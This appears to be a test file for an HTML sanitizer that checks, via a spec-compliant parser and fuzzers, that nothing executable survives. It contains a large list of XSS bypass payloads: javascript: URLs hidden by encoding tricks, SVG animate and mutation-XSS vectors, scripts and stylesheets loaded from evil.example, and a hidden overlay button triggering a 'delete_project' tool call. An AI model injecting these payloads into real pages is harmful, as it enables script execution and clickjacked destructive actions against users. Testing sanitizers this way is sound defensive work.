/**
 * The sanitizer's output, read by a spec-compliant HTML parser (parse5) the way a widget's page reads
 * it, namespaces included: no payload may leave anything the policy removes in the document, not
 * after the parser serializes it and reads it again either, and sanitizing the output again must not
 * change it.
 */

import { parse, serialize } from 'parse5';

import type { UIContentSecurity } from '../../types/ui-config';
import { sanitizeHtml } from '../sanitize-html';

interface TreeNode {
  nodeName: string;
  tagName?: string;
  namespaceURI?: string;
  value?: string;
  attrs?: Array<{ name: string; value: string; prefix?: string }>;
  childNodes?: TreeNode[];
  content?: TreeNode;
}

const SVG = 'http://www.w3.org/2000/svg';
const URL_ATTRIBUTES = new Set([
  'href',
  'src',
  'action',
  'formaction',
  'poster',
  'background',
  'data',
  'srcset',
  'ping',
  'cite',
  'lowsrc',
  'dynsrc',
  'manifest',
  'icon',
  'codebase',
  'classid',
  'archive',
  'longdesc',
  'imagesrcset',
]);
const NAVIGATION: Record<string, string[]> = {
  a: ['href'],
  area: ['href'],
  form: ['action'],
  button: ['formaction'],
  input: ['formaction'],
};
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);

function unescapeCss(text: string): string {
  return text.replace(/\\(?:([0-9a-fA-F]{1,6})\s?|([^\n0-9a-fA-F]))/g, (_m, hex?: string, character?: string) =>
    hex ? String.fromCodePoint(Math.min(parseInt(hex, 16), 0x10ffff) || 0xfffd) : (character ?? ''),
  );
}

/** Whether CSS has an at-keyword named `import`, its name read with escapes. */
function hasImport(css: string): boolean {
  const atKeywords = css.matchAll(/@((?:[-\w\u0080-\uffff]|\\[0-9a-fA-F]{1,6}\s?|\\[^\n0-9a-fA-F])+)/g);
  return [...atKeywords].some(([, name]) => unescapeCss(name).toLowerCase() === 'import');
}

function textOf(node: TreeNode): string {
  return (node.childNodes ?? [])
    .map((child) => (child.nodeName === '#text' ? (child.value ?? '') : textOf(child)))
    .join('');
}

function protocolOf(value: string): string {
  try {
    return new URL(value.trim(), 'https://widget.example/page').protocol;
  } catch {
    return 'invalid:';
  }
}

/** What the page would keep that `policy` removes. */
function findings(root: TreeNode, policy: UIContentSecurity): string[] {
  const found: string[] = [];
  const visit = (node: TreeNode) => {
    const tag = node.tagName?.toLowerCase();
    if (tag) {
      const attributes = node.attrs ?? [];
      const attribute = (name: string) => attributes.find((candidate) => candidate.name === name)?.value;
      const external = attributes.some(({ name }) => ['src', 'href'].includes(name));
      if (tag === 'script' && (!policy.allowInlineScripts || external))
        found.push(`script ${textOf(node).slice(0, 40)}`);
      if (['object', 'embed', 'applet', 'base', 'meta'].includes(tag)) found.push(`<${tag}>`);
      if (node.namespaceURI === SVG && /^(set|animate)/.test(tag)) found.push(`svg <${tag}>`);
      if (tag === 'style' && hasImport(textOf(node))) found.push('@import');
      if (
        tag === 'link' &&
        /stylesheet/i.test(attribute('rel') ?? '') &&
        /^\s*(\w+:|[\\/]{2})/.test(attribute('href') ?? '')
      ) {
        found.push('cross-origin stylesheet');
      }
      for (const { name: localName, value, prefix } of attributes) {
        const name = localName.toLowerCase();
        if (name.startsWith('on') && !policy.allowInlineScripts) found.push(`${tag}[${name}]`);
        if (name === 'srcdoc') found.push(`${tag}[srcdoc]`);
        if (['data-tool-call', 'data-tool-args'].includes(name) && !policy.allowToolCallAttributes)
          found.push(`${tag}[${name}]`);
        // A declaration the browser applies starts with its property name
        const declarations = unescapeCss(value.replace(/\/\*[\s\S]*?(\*\/|$)/g, '')).split(';');
        if (name === 'style' && declarations.some((text) => /^\s*position\s*:[^;]*(fixed|sticky)/i.test(text))) {
          found.push(`${tag}[style=${value}]`);
        }
        if (!URL_ATTRIBUTES.has(name)) continue;
        const navigation = policy.allowUnsafeLinks === true && NAVIGATION[tag]?.includes(name) === true;
        const candidates =
          name === 'srcset' || name === 'imagesrcset'
            ? value.split(',').map((part) => part.trim().split(/\s+/)[0])
            : name === 'ping'
              ? value.split(/\s+/)
              : [value];
        for (const candidate of candidates.filter(Boolean)) {
          const protocol = protocolOf(candidate);
          if (protocol === 'invalid:' || SAFE_PROTOCOLS.has(protocol)) continue;
          if (protocol === 'data:' && tag === 'img' && /^\s*data:image\/(png|gif|jpeg|webp|avif)[;,]/i.test(candidate))
            continue;
          if (navigation && protocol !== 'data:') continue;
          found.push(`${tag}[${prefix ? `${prefix}:` : ''}${name}=${value}]`);
        }
      }
    }
    if (node.content) visit(node.content);
    for (const child of node.childNodes ?? []) visit(child);
  };
  visit(root);
  return found;
}

function bodyOf(document: TreeNode): TreeNode {
  const html = (document.childNodes ?? []).find((node) => node.tagName === 'html') as TreeNode;
  return (html.childNodes ?? []).find((node) => node.tagName === 'body') as TreeNode;
}

function parsePage(markup: string): TreeNode {
  return parse(`<!DOCTYPE html><html><head></head><body>\n${markup}\n</body></html>`) as unknown as TreeNode;
}

/** Everything wrong with the sanitized payload: what the page keeps, what a re-parse keeps, and instability. */
function analyze(payload: string, policy: UIContentSecurity = {}): string[] {
  const output = sanitizeHtml(payload, policy);
  const page = parsePage(output);
  const reparsed = parsePage(serialize(bodyOf(page) as never));
  const stable = sanitizeHtml(output, policy) === output;
  return [
    ...findings(page, policy),
    ...findings(reparsed, policy).map((finding) => `reparsed ${finding}`),
    ...(stable ? [] : ['unstable']),
  ];
}

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>',
  '<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<form><math><mtext></form><form><mglyph><xmp></math>&lt;img src onerror=alert(1)&gt;',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="javas&Tab;cript&colon;alert(1)">x</a>',
  '<a href="javascript&#58alert(1)">x</a>',
  '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>',
  '<a href="java&NewLine;script:alert(1)">x</a>',
  '<a href="&#32;javascript:alert(1)">x</a>',
  '<a href="&nbsp;javascript:alert(1)">x</a>',
  '<a href="java&shy;script:alert(1)">x</a>',
  '<a href="javascript&amp;colon;alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="\u0000javascript:alert(1)">x</a>',
  '<a href="\u0001\u0002javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="javascript:alert(1)" href="https://ok">x</a>',
  '<a HREF="https://ok" href="javascript:alert(1)">x</a>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><button>x</button></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<form><input type=image src=x formaction="javascript:alert(1)"></form>',
  '<isindex action="javascript:alert(1)" type=image>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><a XLINK:HREF="javascript:alert(1)"><text y=20>x</text></a></svg>',
  '<svg><use href="data:image/svg+xml,<svg id=x></svg>#x"/></svg>',
  '<svg><filter><feImage href="javascript:alert(1)"/></filter></svg>',
  '<svg><image href="javascript:alert(1)"/></svg>',
  '<svg><script href="https://evil.example/x.js"></script></svg>',
  '<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
  '<svg><a><animate attributeName="href" values="https://x;javascript:alert(1)"/><text>x</text></a></svg>',
  '<svg><a><animate attributeName="href" values="https://x&#59javascript:alert(1)" dur="1ms" fill="freeze"/><text y="20">click</text></a></svg>',
  '<svg><a><animate attributeName="href" values="/x&#x3bjavascript:alert(1)" dur="1ms" fill="freeze"/><text y="20">click</text></a></svg>',
  '<svg><a><set attributeName="hr&#101;f" to="javascript:alert(1)"/><text y="20">click</text></a></svg>',
  '<svg><a><set attributeName="hre&#102" to="javascript:alert(1)"/><text y="20">click</text></a></svg>',
  '<svg><a><set attributeName="&#32;href" to="javascript:alert(1)"/><text y="20">click</text></a></svg>',
  '<svg><a><set attributeName="xlink&colon;href" to="javascript:alert(1)"/></a></svg>',
  '<svg><a><set attributeName=" href " to="javascript:alert(1)"/><text y=20>x</text></a></svg>',
  '<svg><a><set attributeName="x" attributeName="href" to="javascript:alert(1)"/><text y=20>x</text></a></svg>',
  '<svg><a><animate attributeName=href from="javascript:alert(1)" by="1"/></a></svg>',
  '<svg><set attributeName="href" to="javascript:alert(1)"/></svg>',
  '<math href="javascript:alert(1)">x</math>',
  '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
  '<math><mrow xlink:href="javascript:alert(1)">x</mrow></math>',
  '<body onload=alert(1)>',
  '<frameset onload=alert(1)>',
  '<frameset><frame src="javascript:alert(1)"></frameset>',
  '<details open ontoggle=alert(1)>',
  '<img src="x" onerror="alert(1)"//',
  '<img/src/onerror=alert(1)>',
  '<img src=x one rror=alert(1) onerror =alert(1)>',
  '<img src=x on\u0000error=alert(1)>',
  '<img\u000bsrc=x\u000bonerror=alert(1)>',
  '<<script>alert(1)//<</script>',
  '<scr<script>ipt>alert(1)</script>',
  '<scr\u0000ipt>alert(1)</scr\u0000ipt>',
  '<ſcript>alert(1)</ſcript>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<!--><img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)>-->',
  '<!-- <!-- --><img src=x onerror=alert(1)>',
  '</ <img src=x onerror=alert(1)>>',
  '</1><img src=x onerror=alert(1)>',
  '<!DOCTYPE html PUBLIC "a><img src=x onerror=alert(1)>">',
  '<svg><![CDATA[ > <img src=x onerror=alert(1)> ]]></svg>',
  '<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>',
  '<?xml <img src=x onerror=alert(1)>?>',
  '<script><!--<script></script><img src=x onerror=alert(1)></script>',
  '<script>x</script ><img src=x onerror=alert(1)>',
  '<title><img src=x onerror=alert(1)></title>',
  '<svg><title><img src=x onerror=alert(1)></title></svg>',
  '<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<svg><xmp><img src=x onerror=alert(1)></xmp></svg>',
  '<plaintext><img src=x onerror=alert(1)>',
  '<template><img src=x onerror=alert(1)></template>',
  '<div><template shadowrootmode="open"><img src=x onerror=alert(1)><slot></slot></template></div>',
  '<select><style></select><img src=x onerror=alert(1)></style>',
  '<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<link rel="stylesheet" href="javascript:alert(1)">',
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<link rel="alternate STYLESHEET" href="//evil.example/x.css">',
  '<style>@import url(https://evil.example/x.css);</style>',
  '<style>@IMPORT "https://evil.example/x.css"; p { color: red }</style>',
  '<style>@\\69mport url(https://evil.example/x.css);</style>',
  '<style>@\\69 mport url(https://evil.example/x.css);</style>',
  '<style>@\\69\r\nmport url(https://evil.example/x.css);</style>',
  '<style>@\\000069mport url(https://evil.example/x.css);</style>',
  '<svg><style>&#64;import url(https://evil.example/x.css);</style></svg>',
  '<img srcset="x 1x, javascript:alert(1) 2x">',
  '<video poster="javascript:alert(1)"></video>',
  '<table background="javascript:alert(1)"></table>',
  '<a href=/ ping="javascript:alert(1)">x</a>',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<div style="x" onclick="alert(1)" onclick="y">x</div>',
  '<button data-tool-call="delete_project" data-tool-args=\'{"confirm":true}\'>Show details</button>',
  '<button DATA-TOOL-CALL="delete_project" style="position:fixed;inset:0;opacity:0;z-index:2147483647">x</button>',
  '<svg><a data-tool-call="delete_project"><text>x</text></a></svg>',
  '<div style="position: FIXED !important; inset: 0">x</div>',
  '<div style="pos\\ition:f\\69xed">x</div>',
  '<div style="position:/**/sticky">x</div>',
  '<div style="--p:fixed;position:var(--p)">x</div>',
  '<div style="color:red;position&#58;fixed">x</div>',
  `<style>${'İ'.repeat(10)}</style><b>after</b><i>x</i>`,
  `<title>${'İ'.repeat(3)}</title><b onclick=x>bold</b>`,
];

describe('sanitizeHtml, as a browser parses its output', () => {
  it.each(PAYLOADS)('leaves nothing that runs in %s', (payload) => {
    expect(analyze(payload)).toEqual([]);
  });

  it('confirms the payloads do run unsanitized', () => {
    const unsafe = PAYLOADS.filter((payload) => findings(parsePage(payload), {}).length > 0);
    expect(unsafe.length).toBeGreaterThan(PAYLOADS.length * 0.75);
  });

  it.each([
    { allowUnsafeLinks: true },
    { allowInlineScripts: true },
    { allowToolCallAttributes: true },
    { allowUnsafeLinks: true, allowInlineScripts: true, allowToolCallAttributes: true },
  ])('leaves only what %j allows', (policy) => {
    expect(PAYLOADS.map((payload) => analyze(payload, policy)).flat()).toEqual([]);
  });

  it.each([
    ['an iframe src', '<iframe src="javascript:parent.document.body.textContent=1"></iframe>'],
    ['a data:text/html iframe', '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'],
    ['a data:text/html link', '<a href="data:text/html,<script>alert(1)</script>">x</a>'],
    ['an image src', '<img src="javascript:alert(1)">'],
  ])('keeps no script URL in %s with allowUnsafeLinks', (_name, payload) => {
    expect(analyze(payload, { allowUnsafeLinks: true })).toEqual([]);
    expect(sanitizeHtml(payload, { allowUnsafeLinks: true })).not.toMatch(/javascript:|data:text/);
  });

  it.each([
    ['an external script', '<script src="https://evil.example/x.js"></script>'],
    ['an SVG script href', '<svg><script href="https://evil.example/x.js"></script></svg>'],
    ['an embed', '<embed src="https://evil.example/x" type="text/html">'],
    ['an object', '<object data="https://evil.example/x.html"></object>'],
    [
      'base and meta',
      '<base href="https://evil.example/"><meta http-equiv=refresh content="0;url=https://evil.example">',
    ],
    ['a javascript: link', '<a href="javascript:alert(1)">x</a>'],
    ['markup after an escaped script', '<script><!--<script></script><a href="javascript:alert(1)">x</a></script>'],
  ])('keeps no code from elsewhere in %s with allowInlineScripts', (_name, payload) => {
    expect(analyze(payload, { allowInlineScripts: true })).toEqual([]);
  });

  it('keeps no markup a dotted capital I could smuggle past a script end tag', () => {
    const smuggled =
      '</script><a href="javascript:alert(document.domain)">click</a><meta http-equiv="refresh" content="0;url=https://evil.example/">';
    const payload = `<script>${'İ'.repeat(smuggled.length)}</script>${smuggled}</script>`;
    expect(analyze(payload, { allowInlineScripts: true })).toEqual([]);
  });
});

/** A small linear congruential generator, so each seed gives the same payloads every run. */
function seeded(seed: number): () => number {
  let state = seed;
  return () => {
    state = (Math.imul(state, 48271) + 1) >>> 0;
    return state / 0x100000000;
  };
}

const GRAMMAR = {
  tags: [
    'a',
    'img',
    'svg',
    'math',
    'mtext',
    'mglyph',
    'mi',
    'table',
    'select',
    'form',
    'button',
    'set',
    'animate',
    'p',
    'div',
    'foreignObject',
    'desc',
    'template',
    'style',
    'title',
    'textarea',
    'xmp',
    'iframe',
    'noscript',
    'noembed',
    'script',
    'annotation-xml',
    'object',
    'embed',
    'base',
    'meta',
    'link',
    'input',
    'frameset',
    'frame',
    'use',
    'image',
    'Script',
    'STYLE',
    'sCrIpT',
  ],
  attributes: [
    'href',
    'src',
    'xlink:href',
    'action',
    'formaction',
    'onerror',
    'onclick',
    'ONLOAD',
    'srcdoc',
    'attributeName',
    'to',
    'values',
    'from',
    'by',
    'title',
    'id',
    'style',
    'data-x',
    'poster',
    'srcset',
    'encoding',
    'rel',
    'http-equiv',
    'content',
    'x',
    'data-tool-call',
    'data-tool-args',
  ],
  values: [
    'javascript:alert(1)',
    'jav&#x09;ascript:alert(1)',
    'javascript&colon;alert(1)',
    '&#106avascript:alert(1)',
    'href',
    'hr&#101;f',
    'xlink:href',
    'https://ok/',
    '/rel',
    'x',
    '</style><img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    'data:text/html,x',
    'data:image/png,x',
    'text/html',
    '&#59javascript:alert(1)',
    'https://a&#59javascript:alert(1)',
    '\u0000javascript:x',
    ' javascript:alert(1)',
    '&#32;href',
    'a>b',
    "a'b",
    'a"b',
    'position:fixed',
    'stylesheet',
    'delete_project',
  ],
  texts: [
    'x',
    '&lt;img src=x onerror=alert(1)&gt;',
    '<img src=x onerror=alert(1)>',
    '</style>',
    '</script>',
    '<!--',
    '-->',
    '--!>',
    '<![CDATA[',
    ']]>',
    '<?x>',
    '</ x>',
    '<',
    '>',
    'İ',
    '&',
    '\\3c',
    '<!DOCTYPE x>',
    '</title>',
    '</textarea>',
    '</noscript>',
    '@import url(x);',
    '&#64;import',
  ],
};

/** Payloads built from tags, attributes and text that sanitizers commonly get wrong. */
function grammarPayloads(seed: number, count: number): string[] {
  const random = seeded(seed);
  const pick = <T>(list: T[]): T => list[Math.floor(random() * list.length)];
  const attribute = () => {
    const name = pick(GRAMMAR.attributes);
    const value = pick(GRAMMAR.values);
    const separator = pick([' ', ' ', '/', '\n', '\f', '\t']);
    switch (Math.floor(random() * 5)) {
      case 0:
        return `${separator}${name}`;
      case 1:
        return `${separator}${name}="${value.replace(/"/g, '&quot;')}"`;
      case 2:
        return `${separator}${name}='${value.replace(/'/g, '&#39;')}'`;
      case 3:
        return `${separator}${name}=${value.replace(/[\s>]/g, '')}`;
      default:
        return `${separator}${name} = "${value}"`;
    }
  };
  const item = () => {
    const roll = random();
    if (roll < 0.45) {
      let tag = `<${pick(GRAMMAR.tags)}`;
      for (let index = Math.floor(random() * 4); index > 0; index--) tag += attribute();
      return tag + pick(['>', '>', '/>', ' >', '']);
    }
    if (roll < 0.65) return `</${pick(GRAMMAR.tags)}${pick(['>', ' >', '/>', ''])}`;
    return pick(GRAMMAR.texts);
  };
  return Array.from({ length: count }, () => Array.from({ length: 2 + Math.floor(random() * 10) }, item).join(''));
}

const FRAGMENTS = [
  '<',
  '>',
  '/',
  '!',
  '?',
  '-',
  '--',
  '<!--',
  '-->',
  '--!>',
  '<!',
  '<?',
  '</',
  '"',
  "'",
  '=',
  ' ',
  '\t',
  '\n',
  '\f',
  '\u0000',
  '&',
  '&#',
  'x',
  ';',
  '&#59',
  '&#x3a',
  '&colon;',
  '&lt;',
  '[CDATA[',
  ']]>',
  'script',
  'style',
  'title',
  'textarea',
  'xmp',
  'iframe',
  'noscript',
  'noembed',
  'noframes',
  'plaintext',
  'template',
  'svg',
  'math',
  'mtext',
  'mglyph',
  'table',
  'select',
  'form',
  'a',
  'img',
  'set',
  'animate',
  'p',
  'foreignObject',
  'desc',
  ' href=',
  ' src=',
  ' onerror=',
  ' onclick',
  ' attributeName=',
  ' to=',
  ' values=',
  ' srcdoc=',
  ' xlink:href=',
  ' data-tool-call=',
  ' style=',
  'javascript:',
  'java',
  'script:',
  'alert(1)',
  'data:',
  'image/svg+xml,',
  'İ',
  '@import',
  'position:fixed',
];

/** Payloads built character group by character group, for the tokenizer's corner cases. */
function fragmentPayloads(seed: number, count: number): string[] {
  const random = seeded(seed);
  return Array.from({ length: count }, () =>
    Array.from(
      { length: 4 + Math.floor(random() * 22) },
      () => FRAGMENTS[Math.floor(random() * FRAGMENTS.length)],
    ).join(''),
  );
}

describe('sanitizeHtml on generated payloads', () => {
  it.each([1, 2, 3, 4, 5, 6, 7])('leaves nothing that runs in 10,000 grammar payloads of seed %i', (seed) => {
    const failures = grammarPayloads(seed, 10_000)
      .map((payload) => ({ payload, problems: analyze(payload) }))
      .filter(({ problems }) => problems.length > 0);
    expect(failures.slice(0, 3)).toEqual([]);
  });

  it.each([
    [{}, 1],
    [{ allowUnsafeLinks: true }, 2],
    [{ allowInlineScripts: true, allowToolCallAttributes: true }, 3],
  ] as const)('leaves nothing %j forbids in 10,000 fragment payloads', (policy, seed) => {
    const failures = fragmentPayloads(seed, 10_000)
      .map((payload) => ({ payload, problems: analyze(payload, policy) }))
      .filter(({ problems }) => problems.length > 0);
    expect(failures.slice(0, 3)).toEqual([]);
  });
});
